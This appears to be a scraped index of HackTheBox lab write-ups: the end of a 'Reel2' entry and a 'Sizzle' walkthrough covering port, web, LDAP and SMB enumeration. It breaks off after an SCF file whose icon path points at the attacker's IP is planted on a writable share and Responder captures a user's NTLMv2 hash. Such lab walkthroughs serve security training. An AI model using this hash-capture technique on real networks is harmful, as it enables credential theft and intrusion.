cpe:/o:microsoft:windows Host script results: |_clock-skew: -43s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 70.28 seconds Web Server Port 80 Web Server Port 443 gobuster └─$ gobuster dir -u http://10.10.10.210 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 --exclude-length 1233 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.210 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt [+] Negative Status codes: 404 [+] Exclude Length: 1233 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/10/04 16:14:06 Starting gobuster in directory enumeration mode =============================================================== /owa (Status: 301) [Size: 0] [--\u0026gt; /owa/] └─$ gobuster dir -u https://10.10.10.210 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -k =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://10.10.10.210 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/10/04 16:15:56 Starting gobuster in directory enumeration mode =============================================================== /public (Status: 302) [Size: 147] [--\u0026gt; https://10.10.10.210/owa] /exchange (Status: 302) [Size: 147] [--\u0026gt; https://10.10.10.210/owa] /rpc (Status: 401) [Size: 13] /owa (Status: 301) [Size: 0] [--\u0026gt; /owa/] Port 8080 https://wallstant.github.io/ Let\u0026rsquo;s register Foothold/User If we enter empty search string, we have http://10.10.10.210:8080/search?q= We can extract all usernames gregg quimbly joseph Moore teresa trump cube cube sven svensson alex miller michael doe egre55 egre55 travis scott davis marshall jeff Perez frans allen james Martin stig helmer donald Johson\tjhon smith chris Thompson\tkalle garcia cube0x0 cube0x0 lee rodriguez jenny adams david Taylor jim morgan\tlars larsson bob davis charles Jackson fred sanders I\u0026rsquo;ll use TREVORspray Root ","date":"October 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/reel2/images/reel2.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/reel2/","summary":"Reel2 Enumeration nmap └─$ nmap -Pn -p- 10.10.10.210 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 19:51 BST Nmap scan report for 10.10.10.210 (10.10.10.210) Host is up (0.10s latency). Not shown: 65521 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 443/tcp open https 5985/tcp open wsman 6004/tcp open X11:4 6005/tcp open X11:5 6006/tcp open X11:6 6007/tcp open X11:7 6008/tcp open X11:8 6010/tcp open x11 6011/tcp open x11 6012/tcp open x11 6021/tcp open x11 6135/tcp open unknown 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 44.","tags":["HTB"],"title":"[HTB] Machine: Reel2"},{"categories":null,"contents":"Sizzle Enumeration nmap └─$ nmap -Pn -p- 10.10.10.103 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:19 BST Nmap scan report for 10.10.10.103 (10.10.10.103) Host is up (0.11s latency). Not shown: 65506 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 53/tcp open domain 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 443/tcp open https 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 5986/tcp open wsmans 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49668/tcp open unknown 49677/tcp open unknown 49688/tcp open unknown 49689/tcp open unknown 49691/tcp open unknown 49694/tcp open unknown 49699/tcp open unknown 49708/tcp open unknown 49714/tcp open unknown └─$ nmap -Pn -p21,53,80,135,139,443,445,464,593,636,3268,3269,5985,5986,9389,47001 -sC -sV 10.10.10.103 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 03:19 BST Nmap scan report for 10.10.10.103 (10.10.10.103) Host is up (0.10s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn\u0026#39;t have a title (text/html). | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn\u0026#39;t have a title (text/html). |_ssl-date: 2023-10-05T19:21:25+00:00; -7h00m01s from scanner time. | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 | tls-alpn: | h2 |_ http/1.1 | http-methods: |_ Potentially risky methods: TRACE 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp filtered http-rpc-epmap 636/tcp filtered ldapssl 3268/tcp filtered globalcatLDAP 3269/tcp filtered globalcatLDAPssl 5985/tcp filtered wsman 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_ssl-date: 2023-10-05T19:21:25+00:00; -7h00m01s from scanner time. |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 | ssl-cert: Subject: commonName=sizzle.HTB.LOCAL | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:sizzle.HTB.LOCAL | Not valid before: 2018-07-02T20:26:23 |_Not valid after: 2019-07-02T20:26:23 | tls-alpn: | h2 |_ http/1.1 9389/tcp open mc-nmf .NET Message Framing 47001/tcp filtered winrm Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -7h00m00s, deviation: 0s, median: -7h00m01s | smb2-time: | date: 2023-10-05T19:20:48 |_ start_date: 2023-10-05T19:16:02 | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 98.35 seconds ftp └─$ ftp anonymous@10.10.10.103 Connected to 10.10.10.103. 220 Microsoft FTP Service 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; dir 229 Entering Extended Passive Mode (|||56265|) 125 Data connection already open; Transfer starting. 226 Transfer complete. ftp\u0026gt; Web Server gobuster └─$ gobuster dir -u http://10.10.10.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x asp,aspx,txt,html -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.103/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: asp,aspx,txt,html [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 60] /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.103/images/] /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.103/Images/] /Index.html (Status: 200) [Size: 60] /IMAGES (Status: 301) [Size: 150] [--\u0026gt; http://10.10.10.103/IMAGES/] /INDEX.html (Status: 200) [Size: 60] /*checkout*.aspx (Status: 400) [Size: 3420] /*checkout* (Status: 400) [Size: 3420] Lesson learned, we also have to gobuster with IIS focused list └─$ gobuster dir -u http://10.10.10.103/ -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -x asp,aspx,txt,html -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.103/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: asp,aspx,txt,html [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /aspnet_client/ (Status: 403) [Size: 1233] /certenroll/ (Status: 403) [Size: 1233] /certsrv/ (Status: 401) [Size: 1293] /certsrv/mscep/mscep.dll (Status: 401) [Size: 1293] /certsrv/mscep/mscep.dll.aspx (Status: 401) [Size: 1293] /certsrv/mscep/mscep.dll.txt (Status: 401) [Size: 1293] /certsrv/mscep/mscep.dll.html (Status: 401) [Size: 1293] /certsrv/mscep_admin (Status: 401) [Size: 1293] /certsrv/.html (Status: 401) [Size: 1293] /certsrv/.txt (Status: 401) [Size: 1293] /certsrv/.asp (Status: 401) [Size: 1293] /certsrv/.aspx (Status: 401) [Size: 1293] /certsrv/mscep_admin.html (Status: 401) [Size: 1293] /certsrv/mscep_admin.txt (Status: 401) [Size: 1293] /certsrv/mscep/mscep.dll.asp (Status: 401) [Size: 1293] /certsrv/mscep_admin.asp (Status: 401) [Size: 1293] /certsrv/mscep_admin.aspx (Status: 401) [Size: 1293] /images/ (Status: 403) [Size: 1233] ldapsearch └─$ ldapsearch -H ldap://10.10.10.103 -x -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingContexts: DC=HTB,DC=LOCAL namingContexts: CN=Configuration,DC=HTB,DC=LOCAL namingContexts: CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL namingContexts: DC=DomainDnsZones,DC=HTB,DC=LOCAL namingContexts: DC=ForestDnsZones,DC=HTB,DC=LOCAL # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 └─$ ldapsearch -H ldap://10.10.10.103 -x -b \u0026#34;DC=HTB,DC=LOCAL\u0026#34; # extended LDIF # # LDAPv3 # base \u0026lt;DC=HTB,DC=LOCAL\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # search result search: 2 result: 1 Operations error text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v3839 # numResponses: 1 smb └─$ smbclient -N -L //10.10.10.103 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share CertEnroll Disk Active Directory Certificate Services share Department Shares Disk IPC$ IPC Remote IPC NETLOGON Disk Logon server share Operations Disk SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.103 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available I can only access Department Shares └─$ smbclient \u0026#34;//10.10.10.103/Department Shares\u0026#34; Password for [WORKGROUP\\kali]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Tue Jul 3 16:22:32 2018 .. D 0 Tue Jul 3 16:22:32 2018 Accounting D 0 Mon Jul 2 20:21:43 2018 Audit D 0 Mon Jul 2 20:14:28 2018 Banking D 0 Tue Jul 3 16:22:39 2018 CEO_protected D 0 Mon Jul 2 20:15:01 2018 Devops D 0 Mon Jul 2 20:19:33 2018 Finance D 0 Mon Jul 2 20:11:57 2018 HR D 0 Mon Jul 2 20:16:11 2018 Infosec D 0 Mon Jul 2 20:14:24 2018 Infrastructure D 0 Mon Jul 2 20:13:59 2018 IT D 0 Mon Jul 2 20:12:04 2018 Legal D 0 Mon Jul 2 20:12:09 2018 M\u0026amp;A D 0 Mon Jul 2 20:15:25 2018 Marketing D 0 Mon Jul 2 20:14:43 2018 R\u0026amp;D D 0 Mon Jul 2 20:11:47 2018 Sales D 0 Mon Jul 2 20:14:37 2018 Security D 0 Mon Jul 2 20:21:47 2018 Tax D 0 Mon Jul 2 20:16:54 2018 Users D 0 Tue Jul 10 22:39:32 2018 ZZ_ARCHIVE D 0 Mon Jul 2 20:32:58 2018 7779839 blocks of size 4096. 3559060 blocks available Foothold I\u0026rsquo;ll mount the share and download the content └─$ sudo mount -t cifs \u0026#34;//10.10.10.103/Department Shares\u0026#34; /mnt/smb [sudo] password for kali: Password for root@//10.10.10.103/Department Shares: └─$ ls /mnt/smb Accounting Audit Banking CEO_protected Devops Finance HR Infosec Infrastructure IT Legal \u0026#39;M\u0026amp;A\u0026#39; Marketing \u0026#39;R\u0026amp;D\u0026#39; Sales Security Tax Users ZZ_ARCHIVE Nothing interesting inside └─$ tree . . ├── Accounting ├── Audit ├── Banking │ └── Offshore │ ├── Clients │ ├── Data │ ├── Dev │ ├── Plans │ └── Sites ├── CEO_protected ├── Devops ├── Finance ├── HR │ ├── Benefits │ ├── Corporate Events │ ├── New Hire Documents │ ├── Payroll │ └── Policies ├── Infosec ├── Infrastructure ├── IT ├── Legal ├── M\u0026amp;A ├── Marketing ├── R\u0026amp;D ├── Sales ├── Security ├── Tax │ ├── 2010 │ ├── 2011 │ ├── 2012 │ ├── 2013 │ ├── 2014 │ ├── 2015 │ ├── 2016 │ ├── 2017 │ └── 2018 ├── Users │ ├── amanda │ ├── amanda_adm │ ├── bill │ ├── bob │ ├── chris │ ├── henry │ ├── joe │ ├── jose │ ├── lkys37en │ ├── morgan │ ├── mrb3n │ └── Public └── ZZ_ARCHIVE ├── AddComplete.pptx ├── AddMerge.ram ├── ConfirmUnprotect.doc ├── ConvertFromInvoke.mov ├── ConvertJoin.docx ├── CopyPublish.ogg ├── DebugMove.mpg ├── DebugSelect.mpg ├── DebugUse.pptx ├── DisconnectApprove.ogg ├── DisconnectDebug.mpeg2 ├── EditCompress.xls ├── EditMount.doc ├── EditSuspend.mp3 ├── EnableAdd.pptx ├── EnablePing.mov ├── EnableSend.ppt ├── EnterMerge.mpeg ├── ExitEnter.mpg ├── ExportEdit.ogg ├── GetOptimize.pdf ├── GroupSend.rm ├── HideExpand.rm ├── InstallWait.pptx ├── JoinEnable.ram ├── LimitInstall.doc ├── LimitStep.ppt ├── MergeBlock.mp3 ├── MountClear.mpeg2 ├── MoveUninstall.docx ├── NewInitialize.doc ├── OutConnect.mpeg2 ├── PingGet.dot ├── ReceiveInvoke.mpeg2 ├── RemoveEnter.mpeg3 ├── RemoveRestart.mpeg ├── RequestJoin.mpeg2 ├── RequestOpen.ogg ├── ResetCompare.avi ├── ResetUninstall.mpeg ├── ResumeCompare.doc ├── SelectPop.ogg ├── SuspendWatch.mp4 ├── SwitchConvertFrom.mpg ├── UndoPing.rm ├── UninstallExpand.mp3 ├── UnpublishSplit.ppt ├── UnregisterPing.pptx ├── UpdateRead.mpeg ├── WaitRevoke.pptx └── WriteUninstall.mp3 52 directories, 51 files We can check smb permissions Accounting REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL Audit REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL Banking REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL CEO_protected REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL Devops REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL Finance REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL HR REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL Infosec REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL Infrastructure REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL IT REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL Legal REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL M\u0026amp;A REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL Marketing REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL R\u0026amp;D REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL Sales REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL Security REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL Tax REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL Users REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:Everyone:ALLOWED/0x0/READ ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL ZZ_ARCHIVE REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:Everyone:ALLOWED/OI|CI/FULL ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL └─$ for i in $(ls); do (echo $i; smbcacls -N \u0026#39;//10.10.10.103/Department Shares\u0026#39; Users/$i); done amanda REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL amanda_adm REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL bill REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL bob REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL chris REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL henry REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL joe REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL jose REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL lkys37en REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL morgan REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL mrb3n REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL Public REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP:HTB\\Domain Users ACL:Everyone:ALLOWED/OI|CI/FULL ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL ACL:BUILTIN\\Administrators:ALLOWED/OI|CI|I/FULL ACL:Everyone:ALLOWED/OI|CI|I/READ ACL:NT AUTHORITY\\SYSTEM:ALLOWED/OI|CI|I/FULL We have a full permissions on Public We can try placing scf file [Shell] Command=2 IconFile=\\\\10.10.16.9\\anything └─$ smbclient \u0026#34;//10.10.10.103/Department Shares\u0026#34; Password for [WORKGROUP\\kali]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; cd Users smb: \\Users\\\u0026gt; cd Public\\ smb: \\Users\\Public\\\u0026gt; put desktop.scf putting file desktop.scf as \\Users\\Public\\desktop.scf (0.0 kb/s) (average 0.0 kb/s) smb: \\Users\\Public\\\u0026gt; ls . D 0 Fri Oct 6 18:38:02 2023 .. D 0 Fri Oct 6 18:38:02 2023 desktop.scf A 50 Fri Oct 6 18:38:02 2023 7779839 blocks of size 4096. 3558488 blocks available After few minutes responder receives a hash └─$ sudo responder -I tun0 [sudo] password for kali: __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026amp; MDNS Responder 3.1.3.0 ... [SMB] NTLMv2-SSP Client : 10.10.10.103 [SMB] NTLMv2-SSP Username : HTB\\amanda [SMB] NTLMv2-SSP Hash : 